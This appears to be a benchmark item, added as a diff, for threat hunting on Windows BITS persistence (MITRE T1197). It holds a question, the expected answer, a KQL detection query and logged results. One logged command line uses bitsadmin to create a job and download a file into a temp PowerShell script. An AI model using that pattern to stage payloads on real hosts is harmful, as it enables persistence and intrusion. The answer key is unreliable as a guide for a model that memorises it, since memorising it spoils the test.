@@ -1,0 +1,38 @@
+{
+    "technique_id": "T1197",
+    "question_id": "62a06ec5-5754-47d2-bcfc-123d8314c6ae",
+    "context": "A Windows host has indications of a multi-step persistence and execution technique using BITS.",
+    "objective": "Identify the custom identifier used when scheduling a BITS transfer operation.",
+    "technical_details": {
+        "command_analysis": "Review process creation logs for bitsadmin.exe invocations that include the '/create' or '/addfile' switches to extract the job name parameter.",
+        "detection_approach": "Query DeviceProcessEvents for FileName 'bitsadmin.exe' and parse the ProcessCommandLine field to isolate the BITS job name."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Focus on extracting the bits_job_name parameter from bitsadmin.exe command lines; answer should match exactly the value used.",
+    "prompt": "A suspicious BITS transfer was orchestrated via bitsadmin.exe on Windows, creating a job to download and then execute a payload. Investigate the process event logs to determine what custom job name was specified when the BITS job was created.",
+    "answer": [
+        "AtomicBITS"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName == \"bitsadmin.exe\"\n| where ProcessCommandLine contains \"/create\" or ProcessCommandLine contains \"/addfile\"\n| extend JobName = extract(\"(?:/create|/addfile)\\\\s+(?<job>[^ ]+)\", 1, ProcessCommandLine)\n| where isnotempty(JobName)\n| project TimeGenerated, DeviceName, ProcessCommandLine, JobName",
+    "KQL_validation_message": "KQL query validation successful: The 'JobName' field in both results is set to 'AtomicBITS', which is present in the expected answers. Furthermore, the entries show relevant command lines for 'bitsadmin.exe' involving the job named 'AtomicBITS', satisfying the detection requirement. Therefore, the results do provide the evidence necessary to link to the expected answer.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "ProcessCommandLine",
+            "JobName"
+        ],
+        [
+            "2025-05-07 16:50:12.526572+00:00",
+            "windows-vm",
+            "bitsadmin.exe  /create AtomicBITS ",
+            "AtomicBITS"
+        ],
+        [
+            "2025-05-07 16:50:12.587220+00:00",
+            "windows-vm",
+            "bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wipro\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1 ",
+            "AtomicBITS"
+        ]
+    ]
+}
